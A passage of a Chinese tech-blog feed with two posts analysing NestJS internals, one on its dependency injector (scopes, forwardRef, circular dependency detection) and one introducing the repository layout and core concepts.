    contextId = <span class="hljs-variable constant_">STATIC_CONTEXT</span>,
    inquirer?: <span class="hljs-title class_">InstanceWrapper</span>,
  ) {
    <span class="hljs-keyword">const</span> { token } = wrapper;

    <span class="hljs-comment">// 检查是否已解析</span>
    <span class="hljs-keyword">const</span> instanceHost = wrapper.<span class="hljs-title function_">getInstanceByContextId</span>(contextId, inquirer?.<span class="hljs-property">id</span>);
    <span class="hljs-keyword">if</span> (instanceHost.<span class="hljs-property">isResolved</span>) {
      <span class="hljs-keyword">return</span> instanceHost.<span class="hljs-property">instance</span>;
    }

    <span class="hljs-comment">// 解析构造函数依赖</span>
    <span class="hljs-keyword">const</span> dependencies = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolveConstructorParams</span>&lt;T&gt;(
      wrapper,
      moduleRef,
      contextId,
      inquirer,
    );

    <span class="hljs-comment">// 实例化</span>
    <span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">instantiateClass</span>(
      dependencies,
      wrapper,
      wrapper.<span class="hljs-property">inject</span>,
      contextId,
      inquirer,
    );

    <span class="hljs-comment">// 注入属性依赖</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadPropertiesOnInstance</span>(instance, wrapper, moduleRef, contextId);

    <span class="hljs-keyword">return</span> instance;
  }

  <span class="hljs-comment">// 解析构造函数参数</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> resolveConstructorParams&lt;T&gt;(
    <span class="hljs-attr">wrapper</span>: <span class="hljs-title class_">InstanceWrapper</span>&lt;T&gt;,
    <span class="hljs-attr">moduleRef</span>: <span class="hljs-title class_">Module</span>,
    <span class="hljs-attr">contextId</span>: <span class="hljs-title class_">ContextId</span>,
    inquirer?: <span class="hljs-title class_">InstanceWrapper</span>,
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">unknown</span>[]&gt; {
    <span class="hljs-comment">// 获取依赖元数据</span>
    <span class="hljs-keyword">const</span> dependencies = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCtorDependencies</span>(wrapper);

    <span class="hljs-comment">// 并行解析所有依赖</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(
      dependencies.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">async</span> (dependency, index) =&gt; {
        <span class="hljs-keyword">const</span> { <span class="hljs-attr">wrapper</span>: instanceWrapper } = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponent</span>(
          dependency,
          moduleRef,
          contextId,
          wrapper,
          index,
        );
        <span class="hljs-keyword">return</span> instanceWrapper.<span class="hljs-property">instance</span>;
      }),
    );
  }

  <span class="hljs-comment">// 查找依赖</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">lookupComponent</span>(<span class="hljs-params">
    dependency: InjectorDependency,
    moduleRef: Module,
    contextId: ContextId,
    wrapper: InstanceWrapper,
    index: <span class="hljs-built_in">number</span>,
  </span>) {
    <span class="hljs-comment">// 1. 在当前模块查找</span>
    <span class="hljs-keyword">const</span> instanceWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponentInParentModules</span>(
      dependency,
      moduleRef,
      contextId,
      wrapper,
      index,
    );

    <span class="hljs-keyword">if</span> (instanceWrapper) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">wrapper</span>: instanceWrapper };
    }

    <span class="hljs-comment">// 2. 在全局模块查找</span>
    <span class="hljs-keyword">const</span> globalWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponentInGlobalModules</span>(
      dependency,
      contextId,
      wrapper,
    );

    <span class="hljs-keyword">if</span> (globalWrapper) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">wrapper</span>: globalWrapper };
    }

    <span class="hljs-comment">// 3. 未找到，抛出异常</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndefinedDependencyException</span>(wrapper.<span class="hljs-property">name</span>, dependency, index);
  }
}
</code></pre>
<h3 data-id="heading-6">依赖解析流程</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> logger: LoggerService,
    <span class="hljs-keyword">private</span> config: ConfigService,
  </span>) {}
}

解析流程：
┌─────────────────────────────────────────────────────┐
│ <span class="hljs-number">1.</span> 获取构造函数参数类型                              │
│    <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getMetadata</span>(<span class="hljs-string">'design:paramtypes'</span>, target) │
│    → [<span class="hljs-title class_">LoggerService</span>, <span class="hljs-title class_">ConfigService</span>]                 │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ <span class="hljs-number">2.</span> 遍历每个依赖，调用 lookupComponent               │
│    → 在当前模块 providers 中查找                    │
│    → 在 imports 的模块 <span class="hljs-built_in">exports</span> 中查找               │
│    → 在全局模块中查找                               │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ <span class="hljs-number">3.</span> 递归解析依赖的依赖                               │
│    <span class="hljs-title class_">LoggerService</span> 可能也有自己的依赖                 │
└─────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────┐
│ <span class="hljs-number">4.</span> 实例化                                           │
│    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CatsService</span>(loggerInstance, configInstance)  │
└─────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-7">Barrier 并行解析机制</h3>
<p>源码中使用 <code>Barrier</code> 实现依赖的并行解析：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">const</span> paramBarrier = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Barrier</span>(dependencies.<span class="hljs-property">length</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">resolveParam</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">param: <span class="hljs-built_in">unknown</span>, index: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> paramWrapper = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolveSingleParam</span>&lt;T&gt;(<span class="hljs-comment">/*...*/</span>);
    
    <span class="hljs-comment">// 等待所有依赖都解析完成</span>
    <span class="hljs-keyword">await</span> paramBarrier.<span class="hljs-title function_">signalAndWait</span>();
    
    <span class="hljs-keyword">const</span> paramWrapperWithInstance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolveComponentHost</span>(<span class="hljs-comment">/*...*/</span>);
    <span class="hljs-keyword">return</span> instanceHost?.<span class="hljs-property">instance</span>;
  } <span class="hljs-keyword">catch</span> (err) {
    paramBarrier.<span class="hljs-title function_">signal</span>(); <span class="hljs-comment">// 出错也要释放信号</span>
    <span class="hljs-comment">// ...</span>
  }
};

<span class="hljs-keyword">const</span> instances = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(dependencies.<span class="hljs-title function_">map</span>(resolveParam));
</code></pre>
<p><code>Barrier</code> 确保所有依赖的 <code>InstanceWrapper</code> 都被解析后，才开始获取实例。这避免了依赖树静态性判断错误导致的 <code>undefined</code> 注入问题。</p>
<h3 data-id="heading-8">SettlementSignal 循环依赖检测</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">if</span> (instanceHost.<span class="hljs-property">isPending</span>) {
  <span class="hljs-keyword">const</span> settlementSignal = wrapper.<span class="hljs-property">settlementSignal</span>;
  <span class="hljs-keyword">if</span> (inquirer &amp;&amp; settlementSignal?.<span class="hljs-title function_">isCycle</span>(inquirer.<span class="hljs-property">id</span>)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircularDependencyException</span>(<span class="hljs-string">`"<span class="hljs-subst">${wrapper.name}</span>"`</span>);
  }
  <span class="hljs-keyword">return</span> instanceHost.<span class="hljs-property">donePromise</span>!.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">err?: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
  });
}
</code></pre>
<p><code>SettlementSignal</code> 追踪依赖解析链，当检测到循环时抛出 <code>CircularDependencyException</code>。</p>
<h3 data-id="heading-9">作用域</h3>
<p>NestJS 支持三种作用域：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Scope</span> {
  <span class="hljs-variable constant_">DEFAULT</span> = <span class="hljs-number">0</span>,    <span class="hljs-comment">// 单例</span>
  <span class="hljs-variable constant_">TRANSIENT</span> = <span class="hljs-number">1</span>,  <span class="hljs-comment">// 每次注入创建新实例</span>
  <span class="hljs-variable constant_">REQUEST</span> = <span class="hljs-number">2</span>,    <span class="hljs-comment">// 每个请求创建新实例</span>
}
</code></pre>
<h4 data-id="heading-10">单例 (DEFAULT)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {}
</code></pre>
<p>整个应用生命周期只有一个实例。</p>
<h4 data-id="heading-11">瞬态 (TRANSIENT)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>({ <span class="hljs-attr">scope</span>: <span class="hljs-title class_">Scope</span>.<span class="hljs-property">TRANSIENT</span> })
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerService</span> {}
</code></pre>
<p>每次注入都创建新实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">if</span> (wrapper.<span class="hljs-property">scope</span> === <span class="hljs-title class_">Scope</span>.<span class="hljs-property">TRANSIENT</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">instantiateClass</span>(
    dependencies,
    wrapper,
    wrapper.<span class="hljs-property">inject</span>,
    contextId,
    inquirer,
  );
}
</code></pre>
<h4 data-id="heading-12">请求作用域 (REQUEST)</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>({ <span class="hljs-attr">scope</span>: <span class="hljs-title class_">Scope</span>.<span class="hljs-property">REQUEST</span> })
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestService</span> {}
</code></pre>
<p>每个 HTTP 请求创建新实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/router/router-execution-context.ts</span>
<span class="hljs-keyword">if</span> (wrapper.<span class="hljs-property">scope</span> === <span class="hljs-title class_">Scope</span>.<span class="hljs-property">REQUEST</span>) {
  <span class="hljs-keyword">const</span> contextId = <span class="hljs-title function_">createContextId</span>();
  <span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">loadInstance</span>(
    wrapper,
    collection,
    moduleRef,
    contextId,
  );
  <span class="hljs-keyword">return</span> instance;
}
</code></pre>
<h3 data-id="heading-13">自定义 Provider</h3>
<h4 data-id="heading-14">useClass</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-title class_">CatsService</span>,
  <span class="hljs-attr">useClass</span>: <span class="hljs-title class_">MockCatsService</span>,
}
</code></pre>
<h4 data-id="heading-15">useValue</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'CONFIG'</span>,
  <span class="hljs-attr">useValue</span>: { <span class="hljs-attr">apiKey</span>: <span class="hljs-string">'xxx'</span> },
}
</code></pre>
<h4 data-id="heading-16">useFactory</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'ASYNC_CONNECTION'</span>,
  <span class="hljs-attr">useFactory</span>: <span class="hljs-keyword">async</span> (<span class="hljs-attr">config</span>: <span class="hljs-title class_">ConfigService</span>) =&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-title function_">createConnection</span>(config.<span class="hljs-title function_">get</span>(<span class="hljs-string">'database'</span>));
  },
  <span class="hljs-attr">inject</span>: [<span class="hljs-title class_">ConfigService</span>],
}
</code></pre>
<h4 data-id="heading-17">useExisting</h4>
<pre><code class="hljs language-typescript" lang="typescript">{
  <span class="hljs-attr">provide</span>: <span class="hljs-string">'AliasService'</span>,
  <span class="hljs-attr">useExisting</span>: <span class="hljs-title class_">CatsService</span>,
}
</code></pre>
<h3 data-id="heading-18">循环依赖处理</h3>
<p>NestJS 使用 <code>forwardRef</code> 处理循环依赖：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-meta">@Inject</span>(forwardRef(() =&gt; DogsService))
    <span class="hljs-keyword">private</span> dogsService: DogsService,
  </span>) {}
}
</code></pre>
<p>实现原理：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/common/utils/forward-ref.util.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> forwardRef = (<span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">any</span>): <span class="hljs-function"><span class="hljs-params">ForwardReference</span> =&gt;</span> ({
  <span class="hljs-attr">forwardRef</span>: fn,
});

<span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">private</span> <span class="hljs-title function_">resolveParamToken</span>(<span class="hljs-params">param: <span class="hljs-built_in">any</span></span>) {
  <span class="hljs-keyword">if</span> (param &amp;&amp; param.<span class="hljs-property">forwardRef</span>) {
    <span class="hljs-keyword">return</span> param.<span class="hljs-title function_">forwardRef</span>();
  }
  <span class="hljs-keyword">return</span> param;
}
</code></pre>
<h3 data-id="heading-19">属性注入</h3>
<p>除了构造函数注入，还支持属性注入：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-meta">@Inject</span>(<span class="hljs-title class_">LoggerService</span>)
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">logger</span>: <span class="hljs-title class_">LoggerService</span>;
}
</code></pre>
<p>实现：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/injector/injector.ts</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">loadPropertiesOnInstance</span>(<span class="hljs-params">
  instance: <span class="hljs-built_in">object</span>,
  wrapper: InstanceWrapper,
  moduleRef: Module,
  contextId: ContextId,
</span>) {
  <span class="hljs-keyword">const</span> properties = wrapper.<span class="hljs-title function_">getPropertiesMetadata</span>();

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> property <span class="hljs-keyword">of</span> properties) {
    <span class="hljs-keyword">const</span> { key, <span class="hljs-attr">wrapper</span>: propertyWrapper } = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">lookupComponent</span>(
      property.<span class="hljs-property">name</span>,
      moduleRef,
      contextId,
      wrapper,
    );
    instance[key] = propertyWrapper.<span class="hljs-property">instance</span>;
  }
}
</code></pre>
<h3 data-id="heading-20">总结</h3>
<p>NestJS 依赖注入系统的核心：</p>
<ol>
<li><strong>元数据驱动</strong>：通过 <code>reflect-metadata</code> 获取类型信息</li>
<li><strong>InstanceWrapper</strong>：包装每个可注入实例</li>
<li><strong>Module</strong>：管理 providers、controllers、imports、exports</li>
<li><strong>Injector</strong>：递归解析依赖，实例化对象</li>
<li><strong>作用域</strong>：支持单例、瞬态、请求三种作用域</li>
<li><strong>循环依赖</strong>：通过 <code>forwardRef</code> 延迟解析</li>
</ol>
<p>下一篇我们将分析模块系统的实现。</p>
<hr/>
<blockquote>
<p>📦 源码位置：<code>packages/core/injector/</code></p>
<p>下一篇：NestJS 模块系统</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[项目介绍与环境搭建]]></title>    <link>https://juejin.cn/post/7589201772117491718</link>    <guid>https://juejin.cn/post/7589201772117491718</guid>    <pubDate>2025-12-29T09:32:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772117491718" data-draft-id="7589126217249898537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="项目介绍与环境搭建"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-29T09:32:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="借个火er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            项目介绍与环境搭建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    借个火er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:32:28.000Z" title="Mon Dec 29 2025 09:32:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">NestJS 源码解析：项目介绍与环境搭建</h2>
<blockquote>
<p>NestJS 是 Node.js 最流行的企业级框架，本系列将深入源码，揭秘其设计思想。</p>
</blockquote>
<h3 data-id="heading-1">NestJS 是什么</h3>
<p>NestJS 是一个用于构建高效、可扩展的 Node.js 服务端应用的框架。它使用 TypeScript 构建，融合了 OOP、FP、FRP 的编程范式。</p>
<p>核心特点：</p>
<ul>
<li><strong>模块化架构</strong>：借鉴 Angular 的模块系统</li>
<li><strong>依赖注入</strong>：内置 IoC 容器</li>
<li><strong>装饰器驱动</strong>：大量使用 TypeScript 装饰器</li>
<li><strong>平台无关</strong>：支持 Express、Fastify 等底层框架</li>
</ul>
<h3 data-id="heading-2">源码仓库</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/nestjs/nest.git
<span class="hljs-built_in">cd</span> nest
npm install
npm run build
</code></pre>
<p>当前版本：v11.1.10</p>
<h3 data-id="heading-3">项目结构</h3>
<pre><code class="hljs language-bash" lang="bash">nest/
├── packages/
│   ├── common/           <span class="hljs-comment"># 公共模块（装饰器、接口、工具）</span>
│   ├── core/             <span class="hljs-comment"># 核心模块（DI、路由、生命周期）</span>
│   ├── microservices/    <span class="hljs-comment"># 微服务支持</span>
│   ├── platform-express/ <span class="hljs-comment"># Express 适配器</span>
│   ├── platform-fastify/ <span class="hljs-comment"># Fastify 适配器</span>
│   ├── testing/          <span class="hljs-comment"># 测试工具</span>
│   └── websockets/       <span class="hljs-comment"># WebSocket 支持</span>
│
├── integration/          <span class="hljs-comment"># 集成测试</span>
├── sample/               <span class="hljs-comment"># 示例项目</span>
└── tools/                <span class="hljs-comment"># 构建工具</span>
</code></pre>
<h3 data-id="heading-4">核心包说明</h3>
<h4 data-id="heading-5">@nestjs/common</h4>
<p>公共模块，包含：</p>
<ul>
<li>装饰器：<code>@Module</code>、<code>@Controller</code>、<code>@Injectable</code>、<code>@Get</code>、<code>@Post</code> 等</li>
<li>接口：<code>NestModule</code>、<code>CanActivate</code>、<code>PipeTransform</code> 等</li>
<li>异常：<code>HttpException</code>、<code>BadRequestException</code> 等</li>
<li>工具函数</li>
</ul>
<h4 data-id="heading-6">@nestjs/core</h4>
<p>核心运行时，包含：</p>
<ul>
<li><code>NestFactory</code>：应用工厂</li>
<li><code>NestContainer</code>：IoC 容器</li>
<li><code>Injector</code>：依赖注入器</li>
<li><code>DependenciesScanner</code>：模块扫描器</li>
<li><code>RouterExplorer</code>：路由探索器</li>
<li>生命周期钩子</li>
</ul>
<h4 data-id="heading-7">@nestjs/platform-express</h4>
<p>Express 平台适配器，将 NestJS 的抽象映射到 Express。</p>
<h3 data-id="heading-8">核心概念</h3>
<h4 data-id="heading-9">1. 模块 (Module)</h4>
<p>模块是组织代码的基本单元：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [<span class="hljs-title class_">DatabaseModule</span>],
  <span class="hljs-attr">controllers</span>: [<span class="hljs-title class_">CatsController</span>],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">CatsService</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">CatsService</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsModule</span> {}
</code></pre>
<h4 data-id="heading-10">2. 控制器 (Controller)</h4>
<p>处理 HTTP 请求：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Controller</span>(<span class="hljs-string">'cats'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> catsService: CatsService</span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Cat</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">catsService</span>.<span class="hljs-title function_">findAll</span>();
  }
}
</code></pre>
<h4 data-id="heading-11">3. 提供者 (Provider)</h4>
<p>可注入的服务：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CatsService</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">cats</span>: <span class="hljs-title class_">Cat</span>[] = [];

  <span class="hljs-title function_">findAll</span>(): <span class="hljs-title class_">Cat</span>[] {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">cats</span>;
  }
}
</code></pre>
<h4 data-id="heading-12">4. 中间件 (Middleware)</h4>
<p>请求处理管道：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerMiddleware</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NestMiddleware</span> {
  <span class="hljs-title function_">use</span>(<span class="hljs-params">req: Request, res: Response, next: NextFunction</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Request...'</span>);
    <span class="hljs-title function_">next</span>();
  }
}
</code></pre>
